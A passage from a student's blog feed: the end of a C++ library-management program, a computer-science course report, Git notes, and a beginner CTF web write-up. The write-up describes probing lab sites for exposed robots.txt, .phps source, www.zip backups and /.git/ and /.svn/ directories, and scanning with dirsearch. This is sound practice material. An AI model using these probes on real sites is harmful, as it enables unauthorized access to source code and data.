read.read((<span class="keyword">char</span> *)&amp;del, <span class="keyword">sizeof</span> del);</span><br><span class="line">		<span class="keyword">if</span> (mid1 != del.ID) &#123;</span><br><span class="line">			write.open(<span class="string">&quot;admins_info_copy.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">			write.write((<span class="keyword">char</span> *)&amp;del, <span class="keyword">sizeof</span> del);</span><br><span class="line">			write.close();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	read.close();</span><br><span class="line">	write.open(<span class="string">&quot;admins_info.dat&quot;</span>, ios::out);</span><br><span class="line">	write.close();</span><br><span class="line">	read.open(<span class="string">&quot;admins_info_copy.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">	<span class="keyword">while</span> (!read.eof()) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!read)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		read.read((<span class="keyword">char</span> *)&amp;del, <span class="keyword">sizeof</span> del);</span><br><span class="line">		write.open(<span class="string">&quot;admins_info.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">		write.write((<span class="keyword">char</span> *)&amp;del, <span class="keyword">sizeof</span> del);</span><br><span class="line">		write.close();</span><br><span class="line">	&#125;</span><br><span class="line">	read.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//查找学生/教师信息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Manage::searchperson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> judge1;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请选择查找的人物身份(S/s-学生 T/t-教师):\t&quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; judge1;</span><br><span class="line">	<span class="built_in">cin</span>.ignore();</span><br><span class="line">	<span class="keyword">if</span> (judge1 == <span class="string">&#x27;S&#x27;</span> || judge1 == <span class="string">&#x27;s&#x27;</span>) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入查找方式:\t1.---姓名&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;               \t2.---ID&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">char</span> judge2;</span><br><span class="line">		<span class="keyword">int</span> judge3 = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; judge2;</span><br><span class="line">		<span class="keyword">switch</span> (judge2) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: &#123;</span><br><span class="line">				students search;</span><br><span class="line">				<span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line">				<span class="keyword">do</span> &#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入查找的学生姓名:\t&quot;</span>;</span><br><span class="line">					<span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line">					<span class="built_in">cin</span>.ignore();</span><br><span class="line">					fstream read;</span><br><span class="line">					read.open(<span class="string">&quot;students_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">					<span class="keyword">while</span> (!read.eof()) &#123;</span><br><span class="line">						<span class="keyword">if</span> (!read)</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						read.read((<span class="keyword">char</span> *)&amp;search, <span class="keyword">sizeof</span> search);</span><br><span class="line">						<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(search.name, name)) &#123;</span><br><span class="line">							judge3 = <span class="number">1</span>;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;学生姓名:      &quot;</span> &lt;&lt; search.name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;学生ID:        &quot;</span> &lt;&lt; search.ID &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;学生所借书籍:  &quot;</span> &lt;&lt; search.ownbook_name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					read.close();</span><br><span class="line">					<span class="keyword">if</span> (judge3 == <span class="number">0</span>) &#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;未找到用户 &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;同学&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: &#123;</span><br><span class="line">				students search;</span><br><span class="line">				<span class="keyword">long</span> <span class="keyword">long</span> ID;</span><br><span class="line">				<span class="keyword">do</span> &#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入查找的学生ID:\t&quot;</span>;</span><br><span class="line">					<span class="built_in">cin</span> &gt;&gt; ID;</span><br><span class="line">					fstream read;</span><br><span class="line">					read.open(<span class="string">&quot;students_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">					<span class="keyword">while</span> (!read.eof()) &#123;</span><br><span class="line">						<span class="keyword">if</span> (!read)</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						read.read((<span class="keyword">char</span> *)&amp;search, <span class="keyword">sizeof</span> search);</span><br><span class="line">						<span class="keyword">if</span> (search.ID == ID) &#123;</span><br><span class="line">							judge3 = <span class="number">1</span>;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;学生姓名:      &quot;</span> &lt;&lt; search.name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;学生ID:        &quot;</span> &lt;&lt; search.ID &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;学生所借书籍:  &quot;</span> &lt;&lt; search.ownbook_name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					read.close();</span><br><span class="line">					<span class="keyword">if</span> (judge3 == <span class="number">0</span>) &#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;未找到用户ID为 &quot;</span> &lt;&lt; ID &lt;&lt; <span class="string">&quot; 的同学&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">default</span>: &#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无效字符! 请重新输入:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (judge1 == <span class="string">&#x27;T&#x27;</span> || judge1 == <span class="string">&#x27;t&#x27;</span>) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入查找方式:\t1.---姓名&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;               \t2.---ID&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">char</span> judge2;</span><br><span class="line">		<span class="keyword">int</span> judge3 = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; judge2;</span><br><span class="line">		<span class="keyword">switch</span> (judge2) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: &#123;</span><br><span class="line">				teachers search;</span><br><span class="line">				<span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line">				<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入查找的教师姓名:\t&quot;</span>;</span><br><span class="line">					<span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line">					<span class="built_in">cin</span>.ignore();</span><br><span class="line">					fstream read;</span><br><span class="line">					read.open(<span class="string">&quot;teachers_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">					<span class="keyword">while</span> (!read.eof()) &#123;</span><br><span class="line">						<span class="keyword">if</span> (!read)</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						read.read((<span class="keyword">char</span> *)&amp;search, <span class="keyword">sizeof</span> search);</span><br><span class="line">						<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(search.name, name)) &#123;</span><br><span class="line">							judge3 = <span class="number">1</span>;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;教师姓名:      &quot;</span> &lt;&lt; search.name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;教师ID:        &quot;</span> &lt;&lt; search.ID &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;教师所借书籍:  &quot;</span> &lt;&lt; search.ownbook_name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					read.close();</span><br><span class="line">					<span class="keyword">if</span> (judge3 == <span class="number">0</span>) &#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;未找到用户 &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;同学&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: &#123;</span><br><span class="line">				teachers search;</span><br><span class="line">				<span class="keyword">long</span> <span class="keyword">long</span> ID;</span><br><span class="line">				<span class="keyword">do</span> &#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入查找的教师ID:\t&quot;</span>;</span><br><span class="line">					<span class="built_in">cin</span> &gt;&gt; ID;</span><br><span class="line">					fstream read;</span><br><span class="line">					read.open(<span class="string">&quot;teachers_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">					<span class="keyword">while</span> (!read.eof()) &#123;</span><br><span class="line">						<span class="keyword">if</span> (!read)</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						read.read((<span class="keyword">char</span> *)&amp;search, <span class="keyword">sizeof</span> search);</span><br><span class="line">						<span class="keyword">if</span> (search.ID == ID) &#123;</span><br><span class="line">							judge3 = <span class="number">1</span>;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;教师姓名:      &quot;</span> &lt;&lt; search.name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;教师ID:        &quot;</span> &lt;&lt; search.ID &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;教师所借书籍:  &quot;</span> &lt;&lt; search.ownbook_name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					read.close();</span><br><span class="line">					<span class="keyword">if</span> (judge3 == <span class="number">0</span>) &#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;未找到用户ID为 &quot;</span> &lt;&lt; ID &lt;&lt; <span class="string">&quot; 的同学&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">default</span>: &#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无效字符! 请重新输入:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>馆长初始登录信息就写个程序写入文件了</p>
</blockquote>
<h2 id="change-director-cpp"><a href="#change-director-cpp" class="headerlink" title="change_director.cpp"></a>change_director.cpp</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">director</span>&#123;</span></span><br><span class="line">	<span class="keyword">char</span> ID[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">char</span> password[<span class="number">10</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	fstream write;</span><br><span class="line">	director registered;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;ID:&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;registered.ID;</span><br><span class="line">	<span class="built_in">cin</span>.ignore();</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;registered.password;</span><br><span class="line">	<span class="built_in">cin</span>.ignore();</span><br><span class="line">	write.open(<span class="string">&quot;director_info.dat&quot;</span>,ios::out|ios::binary);</span><br><span class="line">	write.write((<span class="keyword">char</span> *)&amp;registered,<span class="keyword">sizeof</span> registered);</span><br><span class="line">	write.close();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机科学导论课程学习报告</title>
    <url>/2021/04/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<blockquote>
<p>此文为大一上计算机科学概论课程结课论文，为纪念第一次完成数千字的论文，防止不慎弄丢，因此上传至博客，没啥水平，仅作纪念</p>
</blockquote>
<span id="more"></span>
<h1 id="计算机科学导论课程学习报告"><a href="#计算机科学导论课程学习报告" class="headerlink" title="计算机科学导论课程学习报告"></a>计算机科学导论课程学习报告</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>摘要：继19世纪查尔斯·巴贝奇发明可编程的分析机以来，计算机已经经过了两个世纪的发展。而在计算机高速发展的同时，信息安全也成了每个人不得不重视的问题。通过对计算机科学导论课程的学习，我对于信息安全及计算机组成的见解如下。</p>
<h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><p>关键词：计算机 信息安全 硬件系统 操作系统 网络 数据库 程序设计语言 算法  </p>
<h2 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h2><p>一、引言<br>继19世纪查尔斯·巴贝奇发明可编程的分析机以来，计算机已经经过了两个世纪的发展。1946年诞生的基于二进制的ENIAC，后又改进为冯·诺依曼结构，奠定了未来计算机的基础；1958年，罗伯特·诺伊斯发明了集成电路推动了第三代计算机的发展；1971年，Kenbak公司推出了Kenbak-1，世界上第一台个人PC，计算机从此开始逐渐走进千家万户；1969年，因特网诞生；1989年，英国科学家蒂姆·伯纳斯-李发明了万维网；随着因特网的快速发展，大量的局域网和个人计算机用户接入，世界通过计算机连接在了一起，构成了地球村。</p>
<p>而在计算机高速发展的同时，信息安全也成了每个人不得不重视的问题。作为新时代计算机信息安全专业的学生，我们不仅要学习信息安全方面的知识，更要了解计算机的基础结构、工作原理等。</p>
<h2 id="二、信息安全"><a href="#二、信息安全" class="headerlink" title="二、信息安全"></a>二、信息安全</h2><p>二、信息安全<br>21 世纪是信息的时代。一方面，信息技术伴随计算机的高速发展而迅速壮大，呈现出空前繁荣的景象，另一方面, 危害信息安全的事件不断发生，2016年8月的徐玉玉案，2016年9月Mirai开启僵尸物联网时代，2017年4月“永恒之蓝”勒索病毒在全球范围内爆发……信息安全事关社会稳定和国家安全，为应对新时代愈发严重的信息安全问题，我国于2017年6月1日开始实行《中华人民共和国网络安全法》以确保公民及国家的信息安全。信息安全主要包括以下 4 个方面：信息设备安全、数据安全、内容安全和行为安全，信息系统硬件结构的安全和操作系统的安全是信息系统安全的基础，密码、网络安全等技术是关键技术，只有从信息系统的硬件和软件的底层采取安全措施，从整体上采取措施，才能比较有效地确保信息系统的安全[1]。</p>
<p>在这个技术日新月异的新时代，有木马，有病毒，有Dos攻击，甚至量子计算机也在逐渐的开发中，当这种运算速度远强于传统计算机的工具诞生，届时受到严重威胁的将是整个世界的信息安全，而我们学习信息安全方面的知识，就走在构建信息安全的社会的道路上。在现在这个信息发达，能力者众多的时代，我们若想为构建信息安全社会贡献一份力量，就要加强在这方面的知识能力和认知，多了解国内外信息安全案例，分析导致问题的原因，安全隐患，威胁程度等，并构想该从何去避免此问题发生或解决此问题。</p>
<h2 id="三、浅析计算机"><a href="#三、浅析计算机" class="headerlink" title="三、浅析计算机"></a>三、浅析计算机</h2><p>三、浅析计算机</p>
<h3 id="计算机硬件系统的结构和工作过程"><a href="#计算机硬件系统的结构和工作过程" class="headerlink" title="计算机硬件系统的结构和工作过程"></a>计算机硬件系统的结构和工作过程</h3><p>计算机硬件系统的结构和工作过程：<br>计算机硬件系统为冯·诺依曼结构，分为存储器、运算器、控制器、输入设备和输出设备。</p>
<p>计算机由许多小型电子电路构成门，通过这些电路的电压电平来表示0和1进行布尔运算，而多个门又构成了触发器电路，触发器是计算机存储器的基本部件。超大规模集成（VLSI）技术将数百万个电子元件构造在芯片上，从而创建出包含数百万个触发器及其控制电路的微型设备。存储器是一种利用半导体、磁性介质等技术制成的存储资料的电子设备，其电子电路中的资料以二进制方式存储。存储器可分为内部存储器（即主存储器）和外部存储器。计算机包含了大量如触发器的电路用于存储数据，每一个电路能存储一个位，这种位存储器就是计算机的主存储器。为了区分计算机主存储器中的个存储单元，每个存储单元都被赋予了唯一的“名字”，即地址[2]，CPU可以直接通过寻址找到主存中的内容。内部存储器的特点是读写速度快，但缺点就是具有一定的不稳定性且容量较小，因此有了容量大且更稳定的外部存储器，例如硬盘、CD盘、DVD盘等。机械硬盘、CD盘、DVD盘等外部存储器都是通过高速旋转存储盘来进行读写数据，基于磁技术和光技术的外部存储器读写数据一般通过机械运动来实现，因此有着读写速度慢甚至机械元件易故障的缺点，而闪存技术就解决了这个问题，在闪存系统中，二进制位是由电子信号直接发送到存储介质中的，电子信号使该介质中的二氧化硅微小晶格截获电子，从而转换微电子电路的性质进行存储[2]。与磁系统和光系统不同，闪存对物理震动不敏感，因此，基于闪存技术的固态硬盘已逐步取代了基于磁系统的机械硬盘。</p>
<p>计算机中执行各种算数和逻辑运算的部件被称为运算器，可以执行加、减、乘、除四则运算及与、或、非、异或等逻辑操作。运算器由算数逻辑单元（ALU）、累加器、状态寄存器、通用寄存器等组成。运算器的操作和操作种类由控制器决定，而处理的数据来自存储器，处理后的结果或送回寄存器，或寄存在运算器中。</p>
<p>计算机中按照预定顺序改变主电路或控制电路中电阻值来控制电动机的启动、调速、制动和反向的主令装置被称为控制器，由程序计数器、指令寄存器、指令译码器、时序产生器和操作控制器组成，是发布命令的“决策机构”，即完成协调和指挥整个计算机系统的操作。控制器是用来处理计算机与其他设备的通信的中间设备，是通过电缆与计算机机箱里的外围设备或者是与计算机背面的端口相连接的。<br>输入设备是向计算机输入数据和信息的设备，是计算机与用户或其他设备通信的桥梁，是用户和计算机系统之间进行信息交换的主要装置之一，包括键盘、鼠标等。</p>
<p>输出设备是计算机硬件系统的终端设备，用于接收计算机数据的输出显示、打印、声音、控制外围设备操作等，可以把各种计算结果数据或信息以数字、字符、图像、声音等形式表现出来，例如显示器、打印机、影像输出系统、语音输出系统等。</p>
<h3 id="操作系统、计算机网络及数据库管理系统"><a href="#操作系统、计算机网络及数据库管理系统" class="headerlink" title="操作系统、计算机网络及数据库管理系统"></a>操作系统、计算机网络及数据库管理系统</h3><p>操作系统、计算机网络及数据库管理系统：<br>操作系统（OS）是管理计算机硬件与软件资源的计算机程序，是计算机最基本也是最为重要的基础性系统软件，例如最著名的Windows、Linux等，操作系统需要处理如管理与配置内存、决定系统资源供需的优先次序、控制输入输出设备、操作网络与管理文件系统等基本事务，用于提供给用户一个与系统交互的操作界面。操作系统通常由用户界面和内核组成，用户界面负责与用户进行通信，内核包含着完成计算机安装所需的极基本功能的软件组件。用户通过操作系统的协调与计算机进行交互。</p>
<p>计算机网络，简称为网络，是指容许节点分享资源的数字电信网络。计算机网络通常分为个域网（PAN）、局域网（LAN）、城域网（MAN）和广域网（WAN）。为了网络运行可靠而建立的用于管理网络活动的规则被称为协议，由于因特网为开放式网络，所以需要一些通过一些标准才能使不同厂商的设备和软件一起正常运行，TCP/IP协议簇是因特网所使用的协议标准的集合。一个因特网需要一个互联网范围的编址系统，为该系统内的每台计算机分配一个唯一的标识地址，即IP地址，但由于此种以位模式表示的地址难以记忆，因此出现了另一种基于域的编制系统，域名是由一串用点分隔的名字组成的因特网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位[4]，然后通过DNS服务器解析域名得到IP地址。万维网面世后，这种域名编制系统得到了广泛应用，人们通过URL即可快速访问服务器获取信息。</p>
<p>数据库是指一种多维的数据集合，不同于一维的平面文件只能从一个角度来展示信息，在数据库中可以通过多个数据项之间的内部链接从多个角度来获取信息。数据库管理系统是一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库，它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性[5]。</p>
<h3 id="程序设计语言及算法"><a href="#程序设计语言及算法" class="headerlink" title="程序设计语言及算法"></a>程序设计语言及算法</h3><p>程序设计语言及算法：<br>程序设计语言是用来定义计算机程序的形式语言。它是一种被标准化的交流技巧，用来向计算机发出指令。一种能够让程序员准确地定义计算机所需要使用数据的计算机语言，并精确地定义在不同情况下所应当采取的行动。语言的基础是一组记号和一组规则，根据规则由记号构成的记号串的总体就是程序。程序设计语言的描述一般可以分为语法及语义。语法是说明编程语言中，哪些符号或文字的组合方式是正确的，语义则是对于编程的解释[3]。虽然程序设计语言的种类千差万别，但一般基本成分分为四种，数据成分：用以描述程序中所涉及的数据；运算成分：用以描述程序中所包含的运算；控制成分：用以表达程序中的控制构造；传输成分：用以表达程序中数据的传输。从发展历程来看，程序设计语言可分为四代。第一代机器语言，机器语言由二进制0、1代码指令构成，不同的CPU具有不同的指令系统，机器语言程序难编写、难修改、难维护，且编程效率极低，已渐渐被淘汰。第二代汇编语言，汇编语言指令是机器指令的符号化，与机器指令存在着直接的对应关系，同样的汇编语言同样存在难学难用、容易出错、维护困难等缺点。但其也存在自己的优点，可以直接访问系统接口，汇编语言翻译成的机器语言程序的效率高。第三代高级语言，高级语言是面向用户的、基本上独立于计算机种类和结构的语言。其最大的优点就是形式上接近算术语言和自然语言，概念上接近于人们通常使用的概念。因此，高级语言易学易用，通用性强，应用广泛。</p>
<p>算法是一组明确的、可执行的步骤的有序集合，在有限的时间内终止并产生结果。算法是用来计算的工具，算法的核心是创建问题抽象的模型和明确求解目标，之后可以根据具体的问题选择不同的模式和方法完成算法的设计。在计算机科学中有许多便捷的算法，在处理问题时选对算法会使解决过程变得更加简洁。</p>
<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>四、总结<br>21世纪是信息高度发达的时代，因此信息的重要性非同以往，要构建信息安全的社会还很遥远，可能需要多代人的努力，而现今的接力棒就握在我们手中，社会更需要的是多方面的人才，不仅要学习信息方面的知识，计算机基础理论知识等同样不能舍弃。</p>
<h2 id="参-考-文-献"><a href="#参-考-文-献" class="headerlink" title="参   考   文   献"></a>参   考   文   献</h2><p>[1]    沈昌祥，张焕国，冯登国，曹珍富，黄继武 . 信息安全综述[J]. 中国科学E辑：信息科学. 2007,第37卷（2）：129~150<br>[2]    刘艺，吴英，毛倩倩（译）. 计算机科学概论[M]. 第12版. 北京：人民邮电出版社，2017<br>[3]    范国泰. 语言系统简介[EB/OL]. <a href="https://web.archive.org/">https://web.archive.org</a>，2014-06-05<br>[4]    谢从华，高蕴梅，黄晓华. Web系统与技术[M]. 北京：清华大学出版社，2018<br>[5]    赵静. 数据库管理系统的现状及发展方向[J]. 电脑编程技巧与维护. 2009，12</p>
]]></content>
      <categories>
        <category>计算机科学</category>
      </categories>
      <tags>
        <tag>计算机科学</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习记录</title>
    <url>/2021/04/17/Git%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="Git学习记录"><a href="#Git学习记录" class="headerlink" title="Git学习记录"></a>Git学习记录</h1><p>萌新在线嘤嘤嘤</p>
<span id="more"></span>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ol>
<li><code>git clone URL</code><blockquote>
<p>从该URL下载文件</p>
</blockquote>
<ul>
<li><code>git clone --depth 1 URL</code><blockquote>
<p>从该URL下载最新版本文件</p>
</blockquote>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Web-wp</title>
    <url>/2021/04/16/Web-wp/</url>
    <content><![CDATA[<p>歪脖的达不溜屁</p>
<span id="more"></span>

<h1 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h1><h2 id="web入门"><a href="#web入门" class="headerlink" title="web入门"></a>web入门</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><h4 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h4><p>简单的f12</p>
<h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><p>打开页面提示无法查看源代码 迷惑.jpg</p>
<p>我一下就打开了，很快啊</p>
<p>看了下hint，get新知识，在URL头部添加<code>view-source:</code>即可查看源码</p>
<p>（原来是禁用了右键，习惯用快捷键真是不好意西:-)</p>
<h4 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h4><p>bp抓包，flag在返回包里</p>
<h4 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h4><p>打开robots.txt，得到一个flagishere.txt，打开<code>/flagishere.txt</code>，得到flag</p>
<h4 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h4><p>在URL尾部输入<code>/index.phps</code>，得到phps文件，打开得到flag</p>
<h4 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h4><p>提示应该是源码泄露，用dirsearch扫了一下发现<code>www.zip</code>，下载到本地得到一个fl000g.txt文件，打开得到个flag{flag_here}，提交错误</p>
<p>…原来是个假flag，在URL尾部输入<code>/fl000g.txt</code>得到真flag</p>
<h4 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h4><p>根据提示感觉应该是git泄露，URL尾部添加<code>/.git/</code>，得到flag</p>
<h4 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h4><p>git泄露都考了，应该就是svn了，URL尾部添加<code>/.svn/</code>，得到flag</p>
<h1 id="bugku"><a href="#bugku" class="headerlink" title="bugku"></a>bugku</h1><h2 id="web1-1"><a href="#web1-1" class="headerlink" title="web1"></a>web1</h2><p>…滑稽脸<br><img src="https://z3.ax1x.com/2021/04/16/cf8LQK.jpg" style="zoom: 25%;"><br>F12打开源码，找到flag</p>
<h2 id="web2-1"><a href="#web2-1" class="headerlink" title="web2"></a>web2</h2><p>是一个填写验证码的输入框，然后发现无法输入两个字符，F12审查元素，果然输入框限制了maxlength，修改maxlength为2即可</p>
<h2 id="web3-1"><a href="#web3-1" class="headerlink" title="web3"></a>web3</h2><p>打开场景是一段PHP代码，</p>
